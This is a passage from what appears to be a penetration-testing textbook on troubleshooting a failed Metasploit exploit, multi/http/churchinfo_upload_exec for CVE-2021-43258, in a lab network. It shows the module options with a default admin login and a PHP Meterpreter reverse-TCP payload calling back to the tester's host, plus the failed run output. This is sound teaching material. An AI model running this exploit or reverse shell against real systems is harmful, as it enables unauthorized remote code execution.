  md: 'a communication issue, a wrong path, or a connection problem. Our troubleshooting
    process lets us narrow down exactly where the issue lies so we can figure out
    what actions to take to fix it.


    In this scenario, we will be running the module for **multi/http/churchinfo_upload_exec**
    which exploits CVE-2021-43258 to gain remote code execution. After selecting the
    module and configuring the RHOSTS setting, as shown in [Figure 5.8](#), we can
    attempt to run the exploit.


    ```

    ```text

    msf6 exploit(multi/http/churchinfo_upload_exec) > options


    Module options (exploit/multi/http/churchinfo_upload_exec):


    Name        Current Setting       Required  Description

    EMAIL_MESG  Hello there!          yes       Email message in webapp

    EMAIL_SUBJ  Read this now!        yes       Email subject in webapp

    PASSWORD    churchinfoadmin       yes       Password to login with

    Proxies                           no        A proxy chain of format type:host:port[,type:host:port][...]

    RHOSTS      192.168.40.216        yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html

    RPORT       80                    yes       The target port (TCP)

    SSL         false                 no        Negotiate SSL/TLS for outgoing connections

    TARGETURI   /churchinfo/          yes       The location of the ChurchInfo app

    USERNAME    admin                 yes       Username for ChurchInfo application

    VHOST                             no        HTTP server virtual host


    Payload options (php/meterpreter/reverse_tcp):


    Name   Current Setting  Required  Description

    LHOST  192.168.40.97    yes       The listen address (an interface may be specified)

    LPORT  4444             yes       The listen port

    ```

    ```


    **FIGURE 5.8**  Using the module and configuring the RHOSTS setting for the target
    host. Note that we have an LHOST specified as ourselves on the same network.


    Running the exploit, we can see in [Figure 5.9](#) that there is an error that
    prevents successful exploitation. This indicates that the module did not work
    properly and that some type of issue prevented the proper exploitation.


    ```

    ```text

    msf6 exploit(multi/http/churchinfo_upload_exec) > exploit


    [*] Started reverse TCP handler on 192.168.40.97:4444

    [*] Running automatic check (''set AutoCheck false'' to disable)

    [-] Exploit aborted due to failure: unknown: Cannot reliably check exploitability.
    Target did not respond to a request to its login page! ''set ForceExploit true''
    to override check result.

    [*] Exploit completed, but no session was created.

    ```

    ```


    **FIGURE 5.9**  Uh-oh! Looks like we’re having trouble with this module. Let’s
    troubleshoot!


    At this point, we have a few options. We could try the exploit again to see if
    it might work this time, this happens from time to time. Another option we can
    choose is to get frustrated and quit. It’s not working the way we want it to,
    so let’s just give up and move on.


    INSTEAD, let’s figure out what’s happening and TROUBLESHOOT! Let’s take the time
    to read the error – it is pretty clear that “Target did not respond to a request
    to its login page”. Now what does this mean? It’s most likely that one of these
    conditions exists:


    +   1. The login page does not exist.

    +   2. We have the wrong login page.

    +   3. The web service is not running.


    Now how do we test these theories and determine how to solve the problem? Through
    manual analysis of course! The error we were given states that the login page
    did not respond. First, let’s see if we can browse the website at all. In this
    case, it is supposed to be hosted at http://192.168.40.216.'
